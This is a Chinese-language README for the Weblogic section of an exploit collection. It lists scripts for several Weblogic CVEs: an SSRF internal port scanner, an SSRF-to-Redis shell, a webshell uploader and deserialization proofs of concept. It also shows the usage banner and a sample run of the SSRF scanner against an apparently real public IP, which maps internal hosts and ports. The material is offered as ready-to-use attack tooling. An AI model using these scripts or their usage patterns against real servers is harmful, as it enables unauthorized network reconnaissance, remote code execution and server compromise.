# About Oracle Weblogic
WebLogic是美国Oracle公司出品的一个application server，确切的说是一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。

# Vulnerability list
[**cve-2014-4210_ssrf_scan.py**](https://github.com/zhzyker/exphub/blob/master/weblogic/cve-2014-4210_ssrf_scan.py) Weblogic ssrf扫描内网端口利用脚本 [[使用]](https://freeerror.org/d/483-ssrf)  
[**cve-2014-4210_ssrf_redis_shell.py**](https://github.com/zhzyker/exphub/blob/master/weblogic/cve-2014-4210_ssrf_redis_shell.py) Weblogic ssrf漏洞内网redis未授权getshell脚本[[使用]](https://freeerror.org/d/483-ssrf)  
[**cve-2017-3506_poc.py**](https://github.com/zhzyker/exphub/blob/master/weblogic/cve-2017-3506_poc.py) Weblogic wls-wsat远程命令执行漏洞检测脚本[[使用]](https://freeerror.org/d/468-cve-2017-3506-weblogic-wls-wsat)  
[**cve-2017-3506_webshell.jar**](https://github.com/zhzyker/exphub/blob/master/weblogic/cve-2017-3506_webshell.jar) Weblogic wls-wsat远程命令执行漏洞利用，上传Webshell[[使用]](https://freeerror.org/d/468-cve-2017-3506-weblogic-wls-wsat)  
[**cve-2017-10271_poc.jar**](https://github.com/zhzyker/exphub/blob/master/weblogic/cve-2017-10271_poc.jar) Weblogic < 10.3.6 wls-wsat XMLDecoder反序列化漏洞[[使用]](https://freeerror.org/d/460)

# Readme
部分脚本文件使用说明，详细使用分析请参考[vulnerability-list](https://github.com/zhzyker/exphub/new/master/weblogic#vulnerability-list)中的[使用]
- VER: 漏洞影响版本，一般情况下不在影响范围的版本没有相关漏洞
- USE：脚本文件使用说明，大部分写在了脚本里，执行即可见
- EXP：脚本利用示例，以及执行效果

## cve-2014-4210_ Weblogic SSRF 服务端请求伪造漏洞
VER：
```
Weblogic 10.0.2
Weblogic 10.3.6
```
USE：
```
zhzy@debian:/debian/archives-tool/web-weblogic$ python cve-2014-4210_ssrf_scan.py 
+----------------------------------------------------------------------+
+ USE: python <filename> <target_ip:port> <scan_address> <process>     +
+ EXP: python cve-2014-4210_ssrf_scan.py 1.1.1.1:7001 192.168.1.0 20   +
+ VER: 10.0.2,10.3.6                                                   +
+----------------------------------------------------------------------+
```
EXP：
```
zhzy@debian:/debian/archives-tool/web-weblogic$ python cve-2014-4210_ssrf_scan.py  59.110.214.109:7001 192.168.112.0 30
192.168.112
[*]+------------------------+
[*]+  Scanning ip and port  +
[*]+------------------------+
[+] 192.168.112.1:22
[+] 192.168.112.2:80
[+] 192.168.112.3:7001
[+] 192.168.112.1:7001
[+] 192.168.112.2:6379
[*]+------------------------+
[*]+     Scan completed     +
[*]+------------------------+
```

